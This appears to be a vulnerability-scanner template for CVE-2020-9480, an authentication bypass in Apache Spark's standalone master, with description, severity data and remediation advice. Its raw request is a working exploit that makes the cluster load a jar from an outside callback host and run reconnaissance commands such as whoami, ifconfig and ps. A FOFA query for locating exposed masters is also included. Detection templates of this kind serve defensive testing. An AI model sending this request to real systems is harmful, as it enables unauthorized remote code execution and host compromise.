http:
- extractors:
  - name: submission-id
    regex:
    - '"submissionId"\s*:\s*"([^"]+)"'
    - '"driverState"\s*:\s*"([^"]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(interactsh_protocol, 'http')
    - contains(body, "CreateSubmissionResponse")
    - contains_any(body, "submissionId", "driverState")
    type: dsl
  raw:
  - "POST /v1/submissions/create HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"action\": \"CreateSubmissionRequest\",\n  \"clientSparkVersion\": \"\
    2.3.1\",\n  \"appArgs\": [\"whoami,w,cat /proc/version,ifconfig,route,df -h,free\
    \ -m,netstat -nltp,ps auxf\"],\n  \"appResource\": \"{{url}}\",\n  \"environmentVariables\"\
    : {\"SPARK_ENV_LOADED\":\"1\"},\n  \"mainClass\": \"Exploit\",\n  \"sparkProperties\"\
    : {\n    \"spark.jars\": \"{{url}}\",\n    \"spark.driver.supervise\": \"false\"\
    ,\n    \"spark.app.name\": \"Exploit\",\n    \"spark.eventLog.enabled\": \"true\"\
    ,\n    \"spark.submit.deployMode\": \"cluster\",\n    \"spark.master\": \"spark://{{Hostname}}:6066\"\
    \n  }\n}\n"
id: CVE-2020-9480
info:
  author: riteshs4hu
  classification:
    cve-id: CVE-2020-9480
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
    epss-percentile: 0.99794
    epss-score: 0.933
  description: 'In Apache Spark 2.4.5 and earlier, a standalone resource manager''s
    master may be configured to require authentication (spark.authenticate) via a
    shared secret. When enabled, however, a specially-crafted RPC to the master can
    succeed in starting an application''s resources on the Spark cluster, even without
    the shared key. This can be leveraged to execute shell commands on the host machine.
    This does not affect Spark clusters using other resource managers (YARN, Mesos,
    etc).

    '
  impact: 'Attackers can execute arbitrary shell commands on the host machine, leading
    to full system compromise.

    '
  metadata:
    fofa-query: port="6066" && banner="Spark Master"
    max-request: 1
    product: spark
    vendor: apache
    verified: true
  name: Apache Spark - Authentication Bypass
  reference:
  - https://github.com/XiaoShaYu617/CVE-2020-9480/blob/main/20220624_apache_spark_apache_spark_pre-auth_code_execution_cve-2020-9480.py
  - https://nvd.nist.gov/vuln/detail/cve-2020-9480
  remediation: 'Update to Spark 2.4.6 or later to fix the vulnerability.

    '
  severity: critical
  tags: cve,cve2020,apache,spark,auth-bypass,vkev,vuln
variables:
  url: http://{{interactsh-url}}/{{rand_text_alpha(5)}}.jar
